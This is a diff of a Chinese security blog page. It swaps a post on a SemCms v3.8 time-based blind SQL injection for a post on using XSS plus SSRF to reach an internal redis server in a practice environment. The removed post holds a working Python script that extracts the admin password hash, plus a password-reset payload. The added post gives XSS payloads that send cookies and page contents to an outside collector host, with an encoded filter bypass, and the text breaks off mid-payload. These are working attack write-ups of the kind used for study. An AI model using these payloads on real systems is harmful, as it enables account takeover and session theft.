@@ -70,7 +70,7 @@
 
 
 
-  <meta name="keywords" content="代码审计,0day挖掘,">
+  <meta name="keywords" content="xss,ssrf,">
 
 
 
@@ -83,23 +83,31 @@
 
 
 
-<meta name="description" content="0x00 前言此篇为审计semcms_php_v3.8的第三篇文章 SemCms是一套开源外贸企业网站管理系统，主要用于外贸企业，兼容IE、Firefox 等主流浏览器。SemCms非常适合在外贸企业，电子商务互联网应用上使用，2009年12月首次发布以来，SemCms依靠出色的用户体验和领先的技术不断扩大外贸场占有率，目前在国内已经成为最受欢迎的英文外贸网站之一。官网:http://www.se">
-<meta name="keywords" content="代码审计,0day挖掘">
+<meta name="description" content="0X00 前言由于本菜鸡对xss的认识还停留在弹个框框的层面上，写此文章以求进步。 在实际过程中经常会出现拿到了cookie，却发现后台登陆在内网的情况，本文刚好发现了这样一个xss测试环境，并且在该环境中进一步利用xss结合ssrf攻击了内网的redis服务器，特此记录。 0x01 XSS获取管理员cooklie环境地址:https://xssrf.hackme.inndy.tw在该环境中有一个">
+<meta name="keywords" content="xss,ssrf">
 <meta property="og:type" content="article">
-<meta property="og:title" content="semcms_php_v3.8 时间盲注">
-<meta property="og:url" content="https://zhengbao.wang/semcms-php-v3-8-时间盲注/index.html">
+<meta property="og:title" content="XSSRF攻击内网redis">
+<meta property="og:url" content="https://zhengbao.wang/XSSRF攻击内网redis/index.html">
 <meta property="og:site_name" content="Boogle&#39;s Blog">
-<meta property="og:description" content="0x00 前言此篇为审计semcms_php_v3.8的第三篇文章 SemCms是一套开源外贸企业网站管理系统，主要用于外贸企业，兼容IE、Firefox 等主流浏览器。SemCms非常适合在外贸企业，电子商务互联网应用上使用，2009年12月首次发布以来，SemCms依靠出色的用户体验和领先的技术不断扩大外贸场占有率，目前在国内已经成为最受欢迎的英文外贸网站之一。官网:http://www.se">
+<meta property="og:description" content="0X00 前言由于本菜鸡对xss的认识还停留在弹个框框的层面上，写此文章以求进步。 在实际过程中经常会出现拿到了cookie，却发现后台登陆在内网的情况，本文刚好发现了这样一个xss测试环境，并且在该环境中进一步利用xss结合ssrf攻击了内网的redis服务器，特此记录。 0x01 XSS获取管理员cooklie环境地址:https://xssrf.hackme.inndy.tw在该环境中有一个">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://i.loli.net/2019/03/14/5c89d09c2c001.png">
-<meta property="og:image" content="https://i.loli.net/2019/03/15/5c8b1da3d28e6.png">
-<meta property="og:image" content="https://i.loli.net/2019/03/15/5c8b1ddb08bee.png">
-<meta property="og:image" content="https://i.loli.net/2019/03/15/5c8b9c15355d0.png">
-<meta property="og:updated_time" content="2019-03-25T00:35:03.440Z">
+<meta property="og:image" content="https://i.loli.net/2019/05/01/5cc909e2d34e3.png">
+<meta property="og:image" content="https://i.loli.net/2019/05/01/5cc9093e268dc.png">
+<meta property="og:image" content="https://i.loli.net/2019/05/01/5cc90d4791ba5.png">
+<meta property="og:image" content="https://i.loli.net/2019/05/01/5cc911cf367de.png">
+<meta property="og:image" content="https://i.loli.net/2019/05/01/5cc912d520bb9.png">
+<meta property="og:image" content="https://i.loli.net/2019/05/01/5cc913781b339.png">
+<meta property="og:image" content="https://i.loli.net/2019/05/02/5ccaefd42756d.png">
+<meta property="og:image" content="https://i.loli.net/2019/05/02/5ccaf0a0811e6.png">
+<meta property="og:image" content="https://i.loli.net/2019/05/02/5ccaf3ca9a921.png">
+<meta property="og:image" content="https://i.loli.net/2019/05/02/5ccaf46a09ad6.png">
+<meta property="og:image" content="https://i.loli.net/2019/05/02/5ccaf6a42d22d.png">
+<meta property="og:image" content="https://i.loli.net/2019/05/03/5ccbb184d23dd.png">
+<meta property="og:updated_time" content="2019-05-03T03:24:30.278Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="semcms_php_v3.8 时间盲注">
-<meta name="twitter:description" content="0x00 前言此篇为审计semcms_php_v3.8的第三篇文章 SemCms是一套开源外贸企业网站管理系统，主要用于外贸企业，兼容IE、Firefox 等主流浏览器。SemCms非常适合在外贸企业，电子商务互联网应用上使用，2009年12月首次发布以来，SemCms依靠出色的用户体验和领先的技术不断扩大外贸场占有率，目前在国内已经成为最受欢迎的英文外贸网站之一。官网:http://www.se">
-<meta name="twitter:image" content="https://i.loli.net/2019/03/14/5c89d09c2c001.png">
+<meta name="twitter:title" content="XSSRF攻击内网redis">
+<meta name="twitter:description" content="0X00 前言由于本菜鸡对xss的认识还停留在弹个框框的层面上，写此文章以求进步。 在实际过程中经常会出现拿到了cookie，却发现后台登陆在内网的情况，本文刚好发现了这样一个xss测试环境，并且在该环境中进一步利用xss结合ssrf攻击了内网的redis服务器，特此记录。 0x01 XSS获取管理员cooklie环境地址:https://xssrf.hackme.inndy.tw在该环境中有一个">
+<meta name="twitter:image" content="https://i.loli.net/2019/05/01/5cc909e2d34e3.png">
 
 
 
@@ -129,13 +137,13 @@
 
 
 
-  <link rel="canonical" href="https://zhengbao.wang/semcms-php-v3-8-时间盲注/">
+  <link rel="canonical" href="https://zhengbao.wang/XSSRF攻击内网redis/">
 
 
 
 
 
-  <title>semcms_php_v3.8 时间盲注 | Boogle's Blog</title>
+  <title>XSSRF攻击内网redis | Boogle's Blog</title>
   
 
 
@@ -307,7 +315,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://zhengbao.wang/semcms-php-v3-8-时间盲注/">
+    <link itemprop="mainEntityOfPage" href="https://zhengbao.wang/XSSRF攻击内网redis/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="boogle">
@@ -324,7 +332,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">semcms_php_v3.8 时间盲注</h1>
+          <h1 class="post-title" itemprop="name headline">XSSRF攻击内网redis</h1>
         
 
         <div class="post-meta">
@@ -336,8 +344,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-15T21:23:02+08:00">
-                2019-03-15
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-05-03T11:23:19+08:00">
+                2019-05-03
               </time>
             
 
@@ -377,8 +385,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/semcms-php-v3-8-时间盲注/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count valine-comment-count" data-xid="/semcms-php-v3-8-时间盲注/" itemprop="commentCount"></span>
+                <a href="/XSSRF攻击内网redis/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/XSSRF攻击内网redis/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -386,7 +394,7 @@
 
           
           
-             <span id="/semcms-php-v3-8-时间盲注/" class="leancloud_visitors" data-flag-title="semcms_php_v3.8 时间盲注">
+             <span id="/XSSRF攻击内网redis/" class="leancloud_visitors" data-flag-title="XSSRF攻击内网redis">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -411,7 +419,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  1.4k 字
+                  944 字
                 </span>
               
 
@@ -427,7 +435,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  18 分钟
+                  12 分钟
                 </span>
               
             </div>
@@ -448,18 +456,22 @@
       
 
       
-        <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>此篇为审计semcms_php_v3.8的第三篇文章</p>
-<p>SemCms是一套开源外贸企业网站管理系统，主要用于外贸企业，兼容IE、Firefox 等主流浏览器。<br>SemCms非常适合在外贸企业，电子商务互联网应用上使用，2009年12月首次发布以来，SemCms依靠出色的用户体验和领先的技术不断扩大外贸场占有率，目前在国内已经成为最受欢迎的英文外贸网站之一。<br>官网:<a href="http://www.sem-cms.com" target="_blank" rel="noopener">http://www.sem-cms.com/</a><br>审计版本为最新php版 v3.8<br><img src="https://i.loli.net/2019/03/14/5c89d09c2c001.png" alt></p>
-<h2 id="0x01-web-check-php时间盲注得后台账号密码"><a href="#0x01-web-check-php时间盲注得后台账号密码" class="headerlink" title="0x01 web_check.php时间盲注得后台账号密码"></a>0x01 web_check.php时间盲注得后台账号密码</h2><p>首先查看后台登陆页面,忘记密码处<br><img src="https://i.loli.net/2019/03/15/5c8b1da3d28e6.png" alt><br>后台<code>index.html</code>代码<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span><span class="tag">&lt;<span class="name">li</span> <span class="attr">style</span>=<span class="string">"text-align:right; margin-right:10px; float:right;"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:views();"</span>&gt;</span>如果忘记账号与密码,试试找回?<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"image"</span> <span class="attr">style</span>=<span class="string">"width:70px; height:28px; border:0px;"</span> <span class="attr">src</span>=<span class="string">"SC_Page_Config/Image/SEMCMS_Longin.jpg"</span> /&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">views</span><span class="params">()</span></span>&#123;TINY.box.show(<span class="string">'SEMCMS_Remail.php?type=find'</span>,<span class="number">1</span>,<span class="number">500</span>,<span class="number">130</span>,<span class="number">1</span>)&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="keyword">if</span> (Request(<span class="string">"type"</span>)==<span class="string">"ok"</span>)&#123;</span></span><br><span class="line"><span class="actionscript"> <span class="keyword">var</span> umail=Request(<span class="string">"umail"</span>) ; </span></span><br><span class="line"><span class="actionscript">TINY.box.show(<span class="string">'SEMCMS_Remail.php?type=ok&amp;umail='</span>+umail,<span class="number">1</span>,<span class="number">500</span>,<span class="number">230</span>,<span class="number">1</span>)    </span></span><br><span class="line"><span class="undefined">    </span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">Request</span><span class="params">(strName)</span></span></span></span><br><span class="line"><span class="undefined">&#123;</span></span><br><span class="line"><span class="javascript">thisURL = <span class="built_in">decodeURIComponent</span>(<span class="built_in">document</span>.URL);</span></span><br><span class="line"><span class="undefined">strwrite = thisURL</span></span><br><span class="line"><span class="actionscript"><span class="comment">//document.write(strwrite);</span></span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> strHref =strwrite;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> intPos = strHref.indexOf(<span class="string">"?"</span>);</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> strRight = strHref.substr(intPos + <span class="number">1</span>);</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> arrTmp = strRight.split(<span class="string">"&amp;"</span>);</span></span><br><span class="line"><span class="actionscript"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arrTmp.length; i++)</span></span><br><span class="line"><span class="undefined">&#123;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> arrTemp = arrTmp[i ].split(<span class="string">"="</span>);</span></span><br><span class="line"><span class="actionscript"><span class="keyword">if</span>(arrTemp[<span class="number">0</span>].toUpperCase() == strName.toUpperCase()) <span class="keyword">return</span> arrTemp[<span class="number">1</span>];</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">return</span> <span class="string">""</span>;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>可以当点击忘记密码时，会调用js的<code>views()</code>函数，而该，函数请求了<code>SEMCMS_Remail.php</code>。<br>跟进<code>SEMCMS_Remail.php</code>查看,发现又调用了<code>../Include/web_check.php</code><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">"form"</span> <span class="attr">action</span>=<span class="string">"../Include/web_check.php?type=fintpassword"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">width</span>=<span class="string">"500"</span> <span class="attr">cellpadding</span>=<span class="string">"0"</span> <span class="attr">cellspacing</span>=<span class="string">"0"</span> <span class="attr">class</span>=<span class="string">"table"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">colspan</span>=<span class="string">"2"</span> <span class="attr">align</span>=<span class="string">"right"</span> <span class="attr">class</span>=<span class="string">"tdsbg"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">" float:left;"</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span>找回账号密码!<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:TINY.box.hide()"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"SC_Page_Config/Image/icons/hr.gif"</span> <span class="attr">border</span>=<span class="string">"0"</span> /&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">width</span>=<span class="string">"20%"</span> <span class="attr">align</span>=<span class="string">"right"</span> <span class="attr">valign</span>=<span class="string">"middle"</span>&gt;</span>输入E-mail:<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"left"</span> <span class="attr">valign</span>=<span class="string">"middle"</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"Email"</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"Email"</span> <span class="attr">size</span>=<span class="string">"50"</span> /&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span> <span class="attr">valign</span>=<span class="string">"middle"</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"center"</span> <span class="attr">valign</span>=<span class="string">"middle"</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"furl"</span> <span class="attr">id</span>=<span class="string">"furl"</span> <span class="attr">value</span>=<span class="string">"&lt;?php echo $url =  "</span><span class="attr">http:</span>//"<span class="attr">.</span>$<span class="attr">_SERVER</span> ['<span class="attr">HTTP_HOST</span>']<span class="attr">.</span>$<span class="attr">_SERVER</span>['<span class="attr">PHP_SELF</span>'];  ?&gt;</span>" &gt; <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"button"</span> <span class="attr">id</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"确认找回!"</span> /&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>再次跟进<code>../Include/web_check.php</code><br>发现可以通过直接访问该页面，传入相应的操作进行请求,而无需从后台登陆处忘记密码进入。<br>当GET传入的type为<code>findok</code>时，进入如下分支<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> ($Type==<span class="string">"findok"</span>)&#123; <span class="comment">//  密码找回  </span></span><br><span class="line"> </span><br><span class="line">     $umail=test_input(verify_str($_POST[<span class="string">'Email'</span>]));</span><br><span class="line">     $umm=test_input(verify_str($_POST[<span class="string">'umima'</span>]));</span><br><span class="line">     $urzm=test_input(verify_str($_POST[<span class="string">'uyzm'</span>]));</span><br><span class="line">     $fhurl=str_replace(<span class="string">"SEMCMS_Remail.php"</span>,<span class="string">""</span>,$_POST[<span class="string">'furl'</span>]);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span>(<span class="keyword">empty</span>($umail) || <span class="keyword">empty</span>($umm) || <span class="keyword">empty</span>($urzm))&#123;</span><br><span class="line">         </span><br><span class="line">          <span class="keyword">echo</span><span class="string">'&lt;script language="javascript"&gt;alert("请输入密码与认证码！");history.go(-1);&lt;/script&gt;'</span>;   </span><br><span class="line">         </span><br><span class="line">     &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">         $query=$db_conn-&gt;query(<span class="string">"select * from sc_user where user_email='"</span>.$umail.<span class="string">"' and user_rzm='"</span>.$urzm.<span class="string">"'"</span>);</span><br><span class="line">         <span class="keyword">if</span> (mysqli_num_rows($query)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">         $db_conn-&gt;query(<span class="string">"UPDATE  sc_user SET user_ps=md5($umm)  WHERE user_email='"</span>.$umail.<span class="string">"' and user_rzm='$urzm'"</span>); </span><br><span class="line">         <span class="keyword">echo</span><span class="string">'&lt;script language="javascript"&gt;alert("操作成功返回登陆！");location.href="'</span>.$fhurl.<span class="string">'";&lt;/script&gt;'</span>;</span><br><span class="line">         &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          <span class="keyword">echo</span><span class="string">'&lt;script language="javascript"&gt;alert("邮箱或者验证码错误");location.href="'</span>.$fhurl.<span class="string">'";&lt;/script&gt;'</span>;  </span><br><span class="line">         &#125; </span><br><span class="line">         </span><br><span class="line">     &#125;   </span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>而仔细观察后发现，这里漏洞利用点是前面两篇出现问题的集合，第一篇中讲到可以通过sql盲注获取当前表段的内容，但是由于在那张表中的信息没有很多用处而显得相对鸡肋。而第二篇则是查询两个参数，由于没有对反斜线做过滤，导致前一个参数可以将单引号转义，从而与后面参数单引号闭合导致注入。<br>这里的问题便是两个参数，前者可以将后者闭合，而当前表又是存储了账号密码的<code>sc_user</code>表，是第一篇的鸡肋得到放大。</p>
-<h2 id="0x02-poc"><a href="#0x02-poc" class="headerlink" title="0x02 poc"></a>0x02 poc</h2><p>话不多说，直接放上payload<br><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import <span class="built_in">time</span></span><br><span class="line"></span><br><span class="line">burp0_url = <span class="string">"http://127.0.0.1:80/semcms_php_v3.8/include/web_check.php?type=findok"</span></span><br><span class="line">burp0_headers = &#123;<span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"</span>, <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span>, <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span>, <span class="string">"Referer"</span>: <span class="string">"http://127.0.0.1/semcms_php_v3.8/include/web_check.php?type=finddo&amp;XDEBUG_SESSION_START=17436"</span>, <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>, <span class="string">"Connection"</span>: <span class="string">"close"</span>, <span class="string">"Upgrade-Insecure-Requests"</span>: <span class="string">"1"</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"or if(ascii(substr(user_ps,&#123;0&#125;,1)) like &#123;1&#125;,sleep(3),1)-- -"</span></span><br><span class="line">passwd = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">		burp0_data=&#123;<span class="string">"Email"</span>: <span class="string">"1\\\\"</span>, <span class="string">"umima"</span>: <span class="string">"boogle"</span>, <span class="string">"uyzm"</span>: payload.<span class="built_in">format</span>(str(i),str(j))&#125;</span><br><span class="line">		start_time = <span class="built_in">time</span>.<span class="built_in">time</span>()</span><br><span class="line">		res = requests.post(burp0_url,headers=burp0_headers,data=burp0_data)</span><br><span class="line">		#<span class="built_in">print</span> burp0_data</span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">time</span>.<span class="built_in">time</span>()-start_time &gt; <span class="number">3</span>:</span><br><span class="line">			passwd+=chr(j)</span><br><span class="line">			<span class="built_in">print</span> <span class="string">"[+]The md5 password is :"</span>+passwd</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">"[+]Success get the password!"</span></span><br></pre></td></tr></table></figure></p>
-<h2 id="0x03-修改后台密码"><a href="#0x03-修改后台密码" class="headerlink" title="0x03 修改后台密码"></a>0x03 修改后台密码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$db_conn</span>-&gt;query(<span class="string">"UPDATE  sc_user SET user_ps=md5(<span class="variable">$umm</span>)  WHERE user_email='"</span>.<span class="variable">$umail</span>.<span class="string">"' and user_rzm='<span class="variable">$urzm</span>'"</span>);</span><br></pre></td></tr></table></figure>
-<p>对前面的payload执行结果可以看到，这里由于数据库中对密码采用md5加密，如果密码比较复杂的话，可以就无法查询出明文结果。<br><img src="https://i.loli.net/2019/03/15/5c8b1ddb08bee.png" alt><br>那么便可以继续查看<code>findok</code>后面的<code>update</code>操作。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$db_conn</span>-&gt;query(<span class="string">"UPDATE  sc_user SET user_ps=md5(<span class="variable">$umm</span>)  WHERE user_email='"</span>.<span class="variable">$umail</span>.<span class="string">"' and user_rzm='<span class="variable">$urzm</span>'"</span>);</span><br></pre></td></tr></table></figure></p>
-<p>在该操作中，如果知道<code>$umail</code>和<code>$urzm</code>的值，便可以对密码进行修改。<br>而这两个值均可以通过前面注入出密码的方法得到，这里不再赘述，诸位可自行继续操作。<br>例如此处得到<a href="mailto:`$umail=boogle@qq.com" target="_blank" rel="noopener">`$umail=boogle@qq.com</a><code></code>$urzm=6666`<br>修改密码payload<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//post</span></span><br><span class="line"></span><br><span class="line">Email=boogle@qq.com<span class="variable">&amp;umima</span>=boogle_password<span class="variable">&amp;urzm</span>=<span class="number">6666</span></span><br></pre></td></tr></table></figure></p>
-<p>此处成功修改后台管理员密码为<code>123</code><br><img src="https://i.loli.net/2019/03/15/5c8b9c15355d0.png" alt></p>
-<h2 id="0x04-修复方法"><a href="#0x04-修复方法" class="headerlink" title="0x04 修复方法"></a>0x04 修复方法</h2><p>还是可以通过之前的修复方法，对反斜线<code>\</code>增加过滤即可。</p>
+        <h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a>0X00 前言</h2><p>由于本菜鸡对xss的认识还停留在弹个框框的层面上，写此文章以求进步。</p>
+<p>在实际过程中经常会出现拿到了cookie，却发现后台登陆在内网的情况，本文刚好发现了这样一个xss测试环境，并且在该环境中进一步利用xss结合ssrf攻击了内网的redis服务器，特此记录。</p>
+<h2 id="0x01-XSS获取管理员cooklie"><a href="#0x01-XSS获取管理员cooklie" class="headerlink" title="0x01 XSS获取管理员cooklie"></a>0x01 XSS获取管理员cooklie</h2><p>环境地址:<a href="https://xssrf.hackme.inndy.tw" target="_blank" rel="noopener">https://xssrf.hackme.inndy.tw</a><br>在该环境中有一个send email的功能，可以给管理员发送含有xss的payload以获取其cookie。<br>这里简单测试。发现过滤了<code>&lt;script</code> <code>(</code> <code>)</code> <code>onerror</code>等关键词。<br><img src="https://i.loli.net/2019/05/01/5cc909e2d34e3.png" alt><br>这里可以看到<code>onerror</code>前面是加了空格的，那么可以用下面的payload染过<br>payload<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="selector-tag">img</span> src=<span class="string">"x"</span>onerror=<span class="string">"document.location='http://ay82rc.ceye.io/'+document.cookie"</span>&gt;</span><br></pre></td></tr></table></figure></p>
+<p>发送后管理员查看即可成功返回cookie。<br><img src="https://i.loli.net/2019/05/01/5cc9093e268dc.png" alt></p>
+<h2 id="0x02-xss登陆内网后台"><a href="#0x02-xss登陆内网后台" class="headerlink" title="0x02 xss登陆内网后台"></a>0x02 xss登陆内网后台</h2><p>拿到cookie后这里直接以cookie登陆，发现限制了管理员需要从内网登陆。这里也符合很多实际场景。<br><img src="https://i.loli.net/2019/05/01/5cc90d4791ba5.png" alt></p>
+<p>那么这里可以直接使用xss然后通过<code>document.body.innerHTML</code>打印出其后台页面。<br>修改上面的payload，但是上面已经过滤<code>()</code>，这里可以使用编码绕过。推荐余弦大大的xss在线编码平台<a href="http://www.xssor.io" target="_blank" rel="noopener">xss’or</a><br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="selector-tag">img</span> src=<span class="string">"x"</span>onerror=<span class="string">"document.location='http://ay82rc.ceye.io/'+btoa(document.body.innerHTML)"</span>&gt;</span><br></pre></td></tr></table></figure></p>
+<p>16进制编码后<br><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">"x"</span>onerror=<span class="string">"&amp;<span class="subst">#x0064</span>;&amp;<span class="subst">#x006f</span>;&amp;<span class="subst">#x0063</span>;&amp;<span class="subst">#x0075</span>;&amp;<span class="subst">#x006d</span>;&amp;<span class="subst">#x0065</span>;&amp;<span class="subst">#x006e</span>;&amp;<span class="subst">#x0074</span>;&amp;<span class="subst">#x002e</span>;&amp;<span class="subst">#x006c</span>;&amp;<span class="subst">#x006f</span>;&amp;<span class="subst">#x0063</span>;&amp;<span class="subst">#x0061</span>;&amp;<span class="subst">#x0074</span>;&amp;<span class="subst">#x0069</span>;&amp;<span class="subst">#x006f</span>;&amp;<span class="subst">#x006e</span>;&amp;<span class="subst">#x003d</span>;&amp;<span class="subst">#x0027</span>;&amp;<span class="subst">#x0068</span>;&amp;<span 